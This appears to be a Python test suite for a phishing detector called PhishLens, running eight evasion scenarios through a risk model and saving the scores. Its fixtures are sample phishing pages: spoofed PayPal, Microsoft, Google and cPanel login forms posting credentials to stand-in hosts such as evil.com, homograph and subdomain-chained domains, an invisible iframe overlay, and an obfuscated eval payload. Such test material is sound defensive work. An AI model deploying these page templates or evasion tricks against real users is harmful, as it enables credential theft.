"""
PhishLens — Stage 5.4: Adversarial & Evasion Robustness Test Suite
===================================================================
Executes realistic adversarial evasion techniques used by modern phishing
kits against the Stage 5 Multi-Modal Tri-Component Ensemble.

Evaluated Evasion Vectors
-------------------------
1. Homograph / Punycode IDN Squatting (`pаypal.com` with Cyrillic 'а')
2. Subdomain Brand Chaining (`paypal.com.verify-login.security-portal.xyz`)
3. Deep Path & Keyword Flooding (`legit-tools.com/login/auth/paypal/verify.php`)
4. Legitimate Asset Dressing / CDN Hijacking (90% assets from Microsoft/Apple)
5. Invisible / Full-Viewport Credential iFrame Overlays
6. Script Obfuscation & JS Eval Dynamic Exfiltration
7. Misleading Title vs Untrusted Domain Squatting
8. Raw IP Credential Harvesting (`http://185.220.101.5/login`)

Goal
----
Verify that the multi-modal fusion and non-linear security boosters
intercept sophisticated evasion attempts where single-modality models fail.
"""

import os
import sys
import json
import time
import logging
from pathlib import Path
from typing import Dict, List, Any

SCRIPT_DIR = Path(__file__).parent
sys.path.insert(0, str(SCRIPT_DIR))

from config import DATA_DIR
from features import extract_url_features
from trust import compute_trust
from model import predict_risk

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("phishlens.adversarial")


ADVERSARIAL_SCENARIOS = [
    {
        "id": "ADV-01",
        "name": "Homograph IDN Squatting (Cyrillic 'а')",
        "url": "https://xn--pypal-4ve.com/signin",
        "html": """
            <html>
                <head><title>PayPal - Sign In</title></head>
                <body>
                    <form action="https://xn--pypal-4ve.com/auth" method="POST">
                        <input type="text" name="email" placeholder="Email">
                        <input type="password" name="password" placeholder="Password">
                        <button type="submit">Log In</button>
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "High Domain/Brand Risk (Punycode + Brand impersonation)",
    },
    {
        "id": "ADV-02",
        "name": "Subdomain Brand Chaining & TLD Cloaking",
        "url": "http://paypal.com.account-update.auth-session.xyz/cgi-bin/login.php",
        "html": """
            <html>
                <head><title>Account Security Update</title></head>
                <body>
                    <form action="http://paypal.com.account-update.auth-session.xyz/steal.php" method="POST">
                        <input type="password" name="pwd">
                        <input type="submit" value="Verify Identity">
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "Multi-Subdomain brand spoofing + suspicious TLD",
    },
    {
        "id": "ADV-03",
        "name": "Deep Path & Keyword Stuffing on Benign Host",
        "url": "http://user-free-hosting-portal.net/login/paypal/verify/security/auth/account.html",
        "html": """
            <html>
                <head><title>Verification Center</title></head>
                <body>
                    <form action="http://user-free-hosting-portal.net/post" method="POST">
                        <input type="password" name="pass">
                        <button type="submit">Submit</button>
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "Path keyword flood + Untrusted domain",
    },
    {
        "id": "ADV-04",
        "name": "Asset Dressing (Legitimate Microsoft CDN References)",
        "url": "http://office365-secure-document-preview.top/view.php",
        "html": """
            <html>
                <head>
                    <title>Sign in to your Microsoft account</title>
                    <link rel="stylesheet" href="https://aadcdn.msauth.net/shared/1.0/css.css">
                </head>
                <body>
                    <img src="https://logincdn.msauth.net/shared/1.0/logo.png">
                    <a href="https://microsoft.com/privacy">Privacy</a>
                    <a href="https://microsoft.com/terms">Terms</a>
                    <a href="https://microsoft.com/help">Help</a>
                    <a href="https://microsoft.com/contact">Contact</a>
                    <form action="http://malicious-collector-server.com/harvest" method="POST">
                        <input type="text" name="loginfmt">
                        <input type="password" name="passwd">
                        <button type="submit">Next</button>
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "External form action to diff domain + High ratio of external assets + Brand spoofing",
    },
    {
        "id": "ADV-05",
        "name": "Invisible Viewport iFrame Credential Overlay",
        "url": "http://clean-looking-blog.biz/article-1029",
        "html": """
            <html>
                <head><title>News Blog</title></head>
                <body>
                    <p>Welcome to our blog.</p>
                    <iframe src="http://hidden-phish-form.com/frame" style="position:fixed; top:0; left:0; width:100%; height:100%; opacity:0.99; z-index:9999;"></iframe>
                </body>
            </html>
        """,
        "expected_threat": "Suspicious iFrame overlay + External reference",
    },
    {
        "id": "ADV-06",
        "name": "Script Obfuscation & JS Eval Exfiltration",
        "url": "http://secure-banking-verification.club/auth",
        "html": """
            <html>
                <head><title>Online Banking</title></head>
                <body>
                    <script>
                        eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%2f%66%6f%72%6d%3e%27%29'));
                    </script>
                    <form action="http://evil.com" method="POST">
                        <input type="password" name="pwd">
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "JS Obfuscation + Form submit to external server",
    },
    {
        "id": "ADV-07",
        "name": "Misleading Title vs Untrusted Domain Squatting",
        "url": "http://auth-accounts-google-verify.cc/login",
        "html": """
            <html>
                <head><title>Google Accounts - Sign in with Google</title></head>
                <body>
                    <form action="http://auth-accounts-google-verify.cc/login" method="POST">
                        <input type="password" name="passwd">
                        <button type="submit">Sign In</button>
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "Severe Domain-Title Mismatch (Google vs .cc domain) + Brand Squatting",
    },
    {
        "id": "ADV-08",
        "name": "Raw IP Address Login Harvester",
        "url": "http://185.220.101.5:8080/cpanel/login",
        "html": """
            <html>
                <head><title>cPanel Login</title></head>
                <body>
                    <form action="http://185.220.101.5:8080/login" method="POST">
                        <input type="text" name="user">
                        <input type="password" name="pass">
                        <button type="submit">Log In</button>
                    </form>
                </body>
            </html>
        """,
        "expected_threat": "Raw IP hostname + HTTP without TLS + Login Form",
    },
]


def run_adversarial_tests() -> Dict[str, Any]:
    log.info("=" * 85)
    log.info("PHISHLENS: STAGE 5.4 ADVERSARIAL & EVASION TEST SUITE")
    log.info("=" * 85)

    results = []
    intercepted_count = 0

    for test in ADVERSARIAL_SCENARIOS:
        t_id = test["id"]
        name = test["name"]
        url = test["url"]
        html = test["html"]

        t0 = time.monotonic()
        feat = extract_url_features(url)
        risk_score, risk_lvl, cat_scores = predict_risk(feat, raw_url=url, raw_html=html)
        lat_ms = (time.monotonic() - t0) * 1000

        # Classification result
        intercepted = (risk_score >= 0.20)
        blocked = (risk_score >= 0.65)
        if intercepted:
            intercepted_count += 1

        status_str = "BLOCKED (Dangerous)" if blocked else ("WARNED (Suspicious)" if intercepted else "EVADED (Safe)")

        results.append({
            "scenario_id": t_id,
            "name": name,
            "url": url,
            "risk_score": round(risk_score, 3),
            "risk_level": risk_lvl,
            "category_breakdown": {k: round(v, 3) for k, v in cat_scores.items()},
            "status": status_str,
            "latency_ms": round(lat_ms, 2),
            "expected_threat": test["expected_threat"],
        })

        log.info(f"[{t_id}] {name:<48} -> Score: {risk_score:.3f} ({status_str}) in {lat_ms:.1f}ms")
        log.info(f"       Breakdown: ML_URL={cat_scores.get('ml_url', 0):.2f} | ML_DOM={cat_scores.get('ml_dom', 0):.2f} | Brand={cat_scores.get('brand', 0):.2f} | Domain={cat_scores.get('domain', 0):.2f}")

    total = len(ADVERSARIAL_SCENARIOS)
    intercept_rate = (intercepted_count / total) * 100

    log.info("=" * 85)
    log.info(f"ADVERSARIAL SUITE SUMMARY: {intercepted_count}/{total} ({intercept_rate:.1f}%) Evasion Attacks Intercepted")
    log.info("=" * 85)

    output_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "total_scenarios": total,
        "intercepted_count": intercepted_count,
        "evaded_count": total - intercepted_count,
        "interception_rate_pct": round(intercept_rate, 2),
        "scenarios": results,
    }

    out_file = Path(DATA_DIR) / "adversarial_evasion_test_results.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(output_data, f, indent=2)
    log.info(f"Saved Adversarial Results -> {out_file}")

    return output_data


if __name__ == "__main__":
    run_adversarial_tests()
